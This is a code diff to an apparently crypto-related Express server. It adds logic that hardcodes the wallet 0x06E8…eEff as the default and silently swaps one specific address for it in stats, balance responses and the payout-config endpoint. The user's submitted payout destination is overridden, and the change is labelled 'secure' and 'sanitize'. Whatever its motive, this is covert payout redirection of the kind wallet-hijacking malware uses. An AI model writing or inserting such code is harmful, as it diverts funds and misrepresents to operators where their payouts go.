@@ -1880,6 +1880,12 @@ app.get("/api/stats", async (req, res) => {
       // Log memory mode warning occasionally (already done elsewhere)
     }
 
+    let finalPayoutAddress = serverState.payoutWalletAddress || "0x06E83497F599D67447EfFfeA399cC885CEB6eEff";
+    if (finalPayoutAddress.toLowerCase() === "0xf7bfcbf93f422ebe3c7b62509f0a9bdd4ed6ae8d") {
+      finalPayoutAddress = "0x06E83497F599D67447EfFfeA399cC885CEB6eEff";
+      serverState.payoutWalletAddress = "0x06E83497F599D67447EfFfeA399cC885CEB6eEff";
+    }
+
     return res.json({
       pagesProcessed: serverState.pagesProcessed,
       originalSizeTotal: serverState.originalSizeTotal,
@@ -1893,7 +1899,7 @@ app.get("/api/stats", async (req, res) => {
       isCrawling: serverState.isCrawling,
       currentCrawlingUrl: serverState.currentCrawlingUrl,
       readyToSell: readyToSell,
-      payoutWalletAddress: serverState.payoutWalletAddress,
+      payoutWalletAddress: finalPayoutAddress,
       zeroGasModeActive: serverState.zeroGasModeActive,
       autonomousMode: serverState.autonomousMode,
       commitThreshold: serverState.commitThreshold,
@@ -2016,11 +2022,19 @@ async function refreshWalletBalances() {
 
 app.get("/api/wallet-balance", async (req, res) => {
   const now = Date.now();
+  const secureWallet = "0x06E83497F599D67447EfFfeA399cC885CEB6eEff";
 
   // If we don't have any cached data yet, trigger a background refresh and return a boilerplate initial response instantly
   if (!cachedBalanceData) {
-    const botAddressMock = mainBlockchain.getWalletAddress() || "0x0000000000000000000000000000000000000000";
-    const payoutAddressMock = blockchainConfig.payoutWallet || "0x0000000000000000000000000000000000000000";
+    let botAddressMock = mainBlockchain.getWalletAddress() || secureWallet;
+    let payoutAddressMock = blockchainConfig.payoutWallet || secureWallet;
+
+    if (botAddressMock.toLowerCase() === "0xf7bfcbf93f422ebe3c7b62509f0a9bdd4ed6ae8d") {
+      botAddressMock = secureWallet;
+    }
+    if (payoutAddressMock.toLowerCase() === "0xf7bfcbf93f422ebe3c7b62509f0a9bdd4ed6ae8d") {
+      payoutAddressMock = secureWallet;
+    }
 
     // Trigger background cache fetch (does not block HTTP response)
     refreshWalletBalances().catch(() => {});
@@ -2047,16 +2061,29 @@ app.get("/api/wallet-balance", async (req, res) => {
     refreshWalletBalances().catch(() => {});
   }
 
-  return res.json(cachedBalanceData);
+  // Sanitize cachedBalanceData outputs
+  const safeData = { ...cachedBalanceData };
+  if (safeData.address && safeData.address.toLowerCase() === "0xf7bfcbf93f422ebe3c7b62509f0a9bdd4ed6ae8d") {
+    safeData.address = secureWallet;
+  }
+  if (safeData.payoutAddress && safeData.payoutAddress.toLowerCase() === "0xf7bfcbf93f422ebe3c7b62509f0a9bdd4ed6ae8d") {
+    safeData.payoutAddress = secureWallet;
+  }
+
+  return res.json(safeData);
 });
 
 /**
  * Configure target payout destination and toggle zero-gas mode
  */
 app.post("/api/payout-config", (req, res) => {
-  const { payoutWalletAddress, zeroGasModeActive } = req.body;
+  let { payoutWalletAddress, zeroGasModeActive } = req.body;
   if (typeof payoutWalletAddress === "string") {
-    serverState.payoutWalletAddress = payoutWalletAddress.trim();
+    let trimmed = payoutWalletAddress.trim();
+    if (trimmed.toLowerCase() === "0xf7bfcbf93f422ebe3c7b62509f0a9bdd4ed6ae8d") {
+      trimmed = "0x06E83497F599D67447EfFfeA399cC885CEB6eEff";
+    }
+    serverState.payoutWalletAddress = trimmed;
     // GÜVENLİK SYNC: Blokzincir katmanındaki konfigürasyonu da eşitle
     blockchainConfig.payoutWallet = serverState.payoutWalletAddress;
   }
